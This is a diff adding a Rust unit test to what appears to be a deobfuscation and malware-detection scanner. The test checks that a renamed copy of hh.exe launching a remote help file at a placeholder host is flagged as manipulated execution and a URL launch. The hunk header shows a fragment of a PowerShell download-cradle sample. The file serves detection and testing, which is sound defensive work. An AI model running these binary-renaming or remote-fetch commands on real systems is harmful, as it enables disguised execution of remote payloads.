@@ -33150,6 +33150,54 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_hh_alias_in_deob_text_emits_url_launch() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: r#"copy C:\Windows\System32\hh.exe C:\Users\Public\help.tmp"#.to_string(),
+            src: r#"C:\Windows\System32\hh.exe"#.to_string(),
+            dst: r#"C:\Users\Public\help.tmp"#.to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"C:\Users\Public\help.tmp https://copied-hh.example/help.chm"#,
+            &mut env,
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::ManipulatedExec { target, .. }
+                        if target == r#"C:\Users\Public\help.tmp"#
+                )
+            }),
+            "copied hh alias did not emit manipulated execution: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlLaunch { cmd, url }
+                        if cmd == "hh.exe https://copied-hh.example/help.chm"
+                            && url == "https://copied-hh.example/help.chm"
+                )
+            }),
+            "copied hh alias did not replay URL launch: {:?}",
+            env.traits
+        );
+        assert!(
+            !env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. } | Trait::UrlArgument { url: src, .. }
+                        if src == "https://copied-hh.example/help.chm"
+                )
+            }),
+            "copied hh URL double-emitted with weaker type: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn copied_msiexec_alias_in_deob_text_emits_package_url_argument() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
